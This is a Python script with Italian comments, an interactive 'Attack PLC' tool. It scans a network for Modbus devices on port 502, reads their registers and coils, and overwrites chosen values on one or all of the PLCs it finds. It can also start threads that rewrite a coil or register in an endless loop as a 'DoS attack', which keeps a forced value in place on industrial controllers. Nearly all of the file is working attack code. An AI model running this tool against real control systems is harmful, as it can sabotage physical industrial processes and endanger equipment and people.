import os
import time  # Per la sleep
import datetime  # Per il timestamp dei file JSON (per uso futuro)
import nmap3  # Per lo scan della rete
import json  # Per gestire i file json
import threading  # Per fare poi il loop dell'attacco
from collections import defaultdict
from easymodbus.modbusClient import ModbusClient


class AttackPLC:
    """
    Inizializzo la classe
    """

    def __init__(self):
        self.plc_list = {}
        self.plc_registers = defaultdict(dict)
        self.single_plc_registers = defaultdict(dict)

        self.disInReg = {}
        self.InReg = {}
        self.HolReg = {}
        self.Coils = {}

    """
    [Metodo interno] Verifico se già esiste una scansione precedente. Se non esiste,
    chiedo all'utente di effettuarne una
    """

    def scan_is_present(self):
        if not os.path.exists('plc_list.json'):
            req = input("PLC list not present. Perform a new search? [y/n] ")

            if req == "y" or req == "Y":
                self.find_plcs()
            else:
                return

    """
      Eseguo lo scan della rete con nmap filtrando la porta
      502, così da trovare le PLC attive. 
      Il modulo nmap3 restituisce nativamente in output input
      in formato JSON, e di quello verrà poi fatto una specie
      di parsing per trovare gli host che presentano la porta
      502 aperta (e che indicano appunto le PLC). Il risultato
      dell'intera scansione della rete e la lista delle PLC
      trovate vengono salvate su file .json: il primo è per
      mera referenza, il secondo servirà per i metodi di
      questo script
      """

    def find_plcs(self):
        # Chiedo all'utente quale rete vuole scansionare
        net = input("Network to scan (CIDR format): ")

        # Eseguo lo scan sulla rete specificata
        print(f"Scanning {net}\n")
        nmap = nmap3.NmapScanTechniques()
        results = nmap.nmap_tcp_scan(net, args='-p 502')

        # Salvo il risultato dello scan su file JSON
        with open('network_scan.json', 'w') as f:
            f.write(json.dumps(results, indent=4, sort_keys=True))

        print("Active PLCs found: ")

        # Questo serve esclusivamente come chiave
        # per il dict che andrò a creare. Posso farlo
        # partire anche da 0, è indifferente
        plc_num = 1

        # Elimino gli ultimi due campi della scansione, che
        # non sono host, ma entry messe da nmap
        for address in results:
            if address == "runtime" or address == "stats":
                continue

            # Per ogni indirizzo ip trovato, verifico se la
            # porta 502 è aperta. Se non lo è, salto al
            # prossimo host
            for port in results[address]['ports']:
                if port['state'] != "open":
                    continue

                # Salvo l'host nel dict e incremento il valore
                # della prossima chiave
                self.plc_list[plc_num] = address
                plc_num = plc_num + 1

                # Stampo l'host a video
                print('- ' + address)

        print("\n")

        # Salvo l'intero dict ottenuto su file .json
        with open('plc_list.json', 'w') as p:
            p.write(json.dumps(self.plc_list, indent=4))

        time.sleep(1)  # Questa non servirebbe, è solo per rallentare un po' il flusso di esecuzione...
        input("Done. Presse Enter to continue: ")

    def ask_registers(self):
        req_di_registers = input("Discrete Input Registers. Enter address (0-99): ")
        req_input_registers = input("Input Registers. Enter address range (0-1023): ")
        req_holding_registers = input("Holding Registers. Enter address range (0-1023): ")
        req_coils = input("Coils. Enter addresses separated by comma (0-99): ")

        print("\n")

        return req_di_registers, req_input_registers, req_holding_registers, req_coils

    """
    Leggo i Discrete Input Registers (identificati da %IXa.b).

    Parametri:
    - mb: è il file descriptor della connessione Modbus
    """

    def read_DiscreteInputRegisters(self, mb, param_addr=''):
        # Dictionnary dove andrò a mettere i registri letti e i
        # relativi valori
        registri = {}

        starting_addr = param_addr

        # Converto il valore letto in intero e poi lo trasformo in
        # decimale, così da passarlo al metodo read_discretinputs()
        # (gli indirizzi della PLC sono in base 8, mentre Modbus li
        # vuole in base 10. Si veda per maggiori dettagli
        # https://www.openplcproject.com/reference/modbus-slave/
        # (ma attenzione alla modalità master, che NON ho considerato
        # in questa sede!)
        starting_addr = int(starting_addr)
        starting_addr_dec = starting_addr * 8

        print(f"Reading Discrete Input Registers from %IX{starting_addr}.0 to %IX{starting_addr}.7")
        # Leggo 8 registri a partire dall'indirizzo di partenza. Nulla
        # mi vieterebbe di leggerne anche 100, ma manteniamo la
        # suddivisione in base all'indirizzo...)
        discreteIn = mb.read_discreteinputs(starting_addr_dec, 8)

        # Ricavo il dict dall'output della lettura dei
        # registri
        reg_num = 0  # Identificativo del registro

        for di in discreteIn:
            registri['%IX' + str(starting_addr) + '.' + str(reg_num)] = str(di)
            reg_num += 1

        # Ritorno i registri e il loro valore
        return registri

    """
    Leggo gli Input Registers (identificati da %IWa)

    Parametri:
    - mb: è il file descriptor della connessione Modbus
    """

    def read_InputRegisters(self, mb, param_addr=''):
        registri = {}

        addr_range = param_addr
        starting_addr = int(addr_range.split('-')[0])
        ending_addr = int(addr_range.split('-')[1])

        print(f"Reading Input Registers from %IW{starting_addr} to %IW{ending_addr}")
        inputRegisters = mb.read_inputregisters(starting_addr, ending_addr)

        reg_num = starting_addr

        for ir in inputRegisters:
            registri['%IW' + str(reg_num)] = str(ir)
            reg_num += 1

        return registri

    """
    Leggo gli Output e gli Holding Registers
    """

    def read_HoldingOutputRegisters(self, mb, param_addr=''):
        registri = {}

        addr_range = param_addr
        starting_addr = int(addr_range.split('-')[0])
        ending_addr = int(addr_range.split('-')[1])

        print(f"Reading Holding Registers from %QW{starting_addr} to %QW{ending_addr}")
        holdingRegisters = mb.read_holdingregisters(starting_addr, ending_addr)

        reg_num = starting_addr

        for hr in holdingRegisters:
            registri['%QW' + str(reg_num)] = str(hr)
            reg_num += 1

        return registri

    """
    Leggo le Coils
    """

    def read_Coils(self, mb, param_addr=''):
        registri = {}

        starting_addr = param_addr
        starting_addr = starting_addr.split(',')

        for addr in starting_addr:
            addr = int(addr)
            addr_dec = addr * 8

            print(f"Reading Coils from %QX{addr}.0 to %QX{addr}.7")
            coils = mb.read_coils(addr_dec, 8)

            reg_num = 0

            for coil in coils:
                registri['%QX' + str(addr) + '.' + str(reg_num)] = str(coil)
                reg_num += 1

        return registri

    def read_registers(self, plc, d_ir, ir, hr, cl):
        print(f'Connecting to {plc}')
        print("\n")

        mb = ModbusClient(plc, 502)
        mb.connect()

        # Leggo i vari registri
        self.disInReg = self.read_DiscreteInputRegisters(mb, d_ir)
        self.InReg = self.read_InputRegisters(mb, ir)
        self.HolReg = self.read_HoldingOutputRegisters(mb, hr)
        self.Coils = self.read_Coils(mb, cl)

        mb.close()

        print("\n")

    """
    Analizzo i registri di ogni PLC trovata in precedenza. E' necessario
    aver effettuato uno scan della rete e aver ottenuto una lista di PLC
    attive prima di procedere oltre: se una scansione precedente non è 
    stata trovata, chiedo all'utente se vuole eseguirne una.

    I risultati dello scan vengono salvati in un file .json
    """

    def scan_plcs(self, single_plc='all'):
        self.scan_is_present()

        # Leggo da file la lista delle PLC trovate in precedenza
        with open('plc_list.json', 'r') as f:
            buf = f.read()

        # Converto l'elenco da JSON a dict
        plc_list = json.loads(buf)

        if not single_plc == 'single':
            print("Scanning all PLCs\n")

            req_di_registers, req_input_registers, req_holding_registers, req_coils = self.ask_registers()

            # Analizzo le PLC una a una
            for plc in plc_list:
                self.read_registers(plc_list[plc], req_di_registers, req_input_registers, req_holding_registers, req_coils)

                # Qui dovrei aggiornare il dict, in teoria...
                self.plc_registers[plc_list[plc]]['DiscreteInputRegisters'] = self.disInReg
                self.plc_registers[plc_list[plc]]['InputRegisters'] = self.InReg
                self.plc_registers[plc_list[plc]]['HoldingOutputRegisters'] = self.HolReg
                self.plc_registers[plc_list[plc]]['Coils'] = self.Coils

            # Salvo il risultato della scansione su file
            with open('all_plcs_registers.json', 'w') as pr:
                pr.write(json.dumps(self.plc_registers, indent=4))

        else:
            plc = None

            print("Scanning single PLC\n")
            print("Available PLCs: ")
            count = 1  # Contatore, serve solo per l'elenco delle plc

            for i in plc_list:
                print(f'{str(count)} - {plc_list[i]}')
                count += 1

            print("\n")
            choice = input('Choose a PLC: ')

            for key in plc_list:
                if choice == key:
                    plc = plc_list[key]
                    break

                else:
                    print("Invalid choice")

            print("\n")
            req_di_registers, req_input_registers, req_holding_registers, req_coils = self.ask_registers()

            # Mi connetto alla PLC
            self.read_registers(plc, req_di_registers, req_input_registers, req_holding_registers, req_coils)

            self.single_plc_registers[plc]['DiscreteInputRegisters'] = self.disInReg
            self.single_plc_registers[plc]['InputRegisters'] = self.InReg
            self.single_plc_registers[plc]['HoldingOutputRegisters'] = self.HolReg
            self.single_plc_registers[plc]['Coils'] = self.Coils

            with open(f'{plc}.json', 'w') as sp:
                sp.write(json.dumps(self.single_plc_registers, indent=4))

        # Ritorno al menu principale
        time.sleep(1)  # Nemmeno questaservirebbe, è sempre per rallentare il flusso di esecuzione...
        input("Done. Press Enter to continue ")

    def select_register(self):
        reg_type = None
        modbus_addr = None
        value = None

        choice = input("Select register: ")

        if choice[2] == "X" or choice[2] == "x":
            reg_type = "coil"

            ind = choice.split(choice[2])[1]
            addr = int(ind.split('.')[0]) * 8
            register = int(ind.split('.')[1])
            modbus_addr = addr + register

            value = input("Enter new value [True/False]: ")

        elif choice[2] == "W" or choice[2] == "w":
            reg_type = "register"

            modbus_addr = int(choice.split(choice[2])[1])
            value = input("Enter new value: ")

        return reg_type, modbus_addr, value

    """
    Metodo che andrà in un thread per l'attacco DoS a un registro
    """

    def dos_attack(self, plc, reg_type, modbus_addr, value):
        try:
            mb = ModbusClient(plc, 502)
            mb.connect()
        except:
            print(f"Connection to {plc} failed. Exiting")
            return

        if reg_type == "coil":
            addr = modbus_addr / 8
            addr = int(addr)
            register = modbus_addr % 8

            print(f"DoS attack on %QX{addr}.{register}")
            while True:
                mb.write_single_coil(int(modbus_addr), bool(value))

        elif reg_type == "register":
            while True:
                mb.write_single_register(int(modbus_addr), int(value))

        mb.close()

    def make_attack(self, plc, reg_type, modbus_addr, value, loop):
        if reg_type == 'coil':
            if loop == "Y" or loop == "y":
                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), bool(value)))
                thr1.start()
            else:
                mb = ModbusClient(plc, 502)
                mb.connect()

                mb.write_single_coil(modbus_addr, bool(value))

                mb.close()

        elif reg_type == "register":
            if loop == "Y" or loop == "y":
                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), int(value)))
                thr1.start()
            else:
                mb = ModbusClient(plc, 502)
                mb.connect()

                mb.write_single_register(modbus_addr, int(value))

                mb.close()

    """
    Cambio il valore di un registro sulla PLC
    """

    def change_register_value(self, single_plc='all'):
        if not single_plc == 'single':
            self.scan_is_present()

            with open('all_plcs_registers.json', 'r') as pl:
                plc_list = pl.read()

            plc_list = json.loads(plc_list)

            # Va bene così, perchè devo solo elencare i registri
            # che ho letto prima. Per vedere quali sono, basta prendere
            # la prima PLC in lista, le altre avranno gli stessi registri
            tmp_plc = list(plc_list.keys())[0]
            tmp_plc_data = plc_list[tmp_plc]

            print("Available registers: \n")

            for key, val in tmp_plc_data.items():
                if key == "HoldingOutputRegisters":
                    print(key)
                    print("-----------")

                    for key2, val2 in tmp_plc_data[key].items():
                        print(key2)

                if key == "Coils":
                    print("\n" + key)
                    print("-----------")

                    for key2, val2 in tmp_plc_data[key].items():
                        print(key2)

            print("\n")

            reg_type, modbus_addr, value = self.select_register()

            loop = input("Do you want to perform a DoS on the register? [y/n] ")

            print("\n")

            # Mi connetto a tutte le PLC della lista
            for plc in plc_list:
                print(f"Connecting to {plc}")

                self.make_attack(plc, reg_type, modbus_addr, value, loop)

        else:
            plc = None
            self.scan_is_present()

            with open('plc_list.json', 'r') as pl:
                plc_list = pl.read()

            plc_list = json.loads(plc_list)

            print("Available PLCs: ")
            counter = 1
            for i in plc_list:
                print(f'{counter} - {plc_list[i]}')

            print("\n")
            choice = input("Select PLC: ")

            # Controllo se esiste il file con la scansione della PLC selezionata
            if not os.path.exists(f'{plc_list[str(choice)]}.json'):
                new_scan = input("Scan not found. Perform a new scan for this PLC? [y/n] ")
                if new_scan == 'n' or new_scan == 'N':
                    return
                else:
                    self.scan_plcs('single')

            with open(f'{plc_list[str(choice)]}.json', 'r') as sp:
                plc_data = sp.read()

            plc_data = json.loads(plc_data)

            # Recupero l'indirizzo IP della PLC
            plc = list(plc_data.keys())[0]

            # Recupero le chiavi del registro
            tmp_plc_data = plc_data[plc]

            print("\n")
            print(f"Available registers and values for {plc}: \n")

            for key, val in tmp_plc_data.items():
                if key == "HoldingOutputRegisters":
                    print(key)
                    print("-----------")

                    for key2, val2 in tmp_plc_data[key].items():
                        print(key2 + ' = ' + val2)

                if key == "Coils":
                    print("\n" + key)
                    print("-----------")

                    for key3, val3 in tmp_plc_data[key].items():
                        print(key3 + ' = ' + val3)

            print("\n")
            reg_type, modbus_addr, value = self.select_register()
            loop = input("Do you want to perform a DoS on the register? [y/n]: ")

            self.make_attack(plc, reg_type, modbus_addr, value, loop)

        time.sleep(1)  # Altrimenti mi sballa la stampa in caso di thread
        print("\n")
        input("Done. Presse Enter to continue: ")


"""
Definisco il main. Che poi è il menu da cui richiamo
le varie funzioni del generatore di attacchi...
"""


def main():
    ap = AttackPLC()

    while True:
        # Pulisco lo schermo, che fa più elegante...
        os.system('clear')

        print("==== Attack PLC - Menu ====")
        print("1 - Find active PLCs")
        print("2 - Scan all PLCs registers")
        print("3 - Scan single PLC registers")
        print("4 - Attack PLCs")
        print("5 - Attack single PLC")
        print("6 - Exit\n")
        choice = input("Enter your choice: ")

        if choice == "1":
            ap.find_plcs()
        elif choice == "2":
            ap.scan_plcs('all')
        elif choice == "3":
            ap.scan_plcs('single')
        elif choice == "4":
            ap.change_register_value('all')
        elif choice == "5":
            ap.change_register_value('single')
        elif choice == "6":
            os._exit(1)
        else:
            print("Invalid choice\n")


if __name__ == '__main__':
    main()
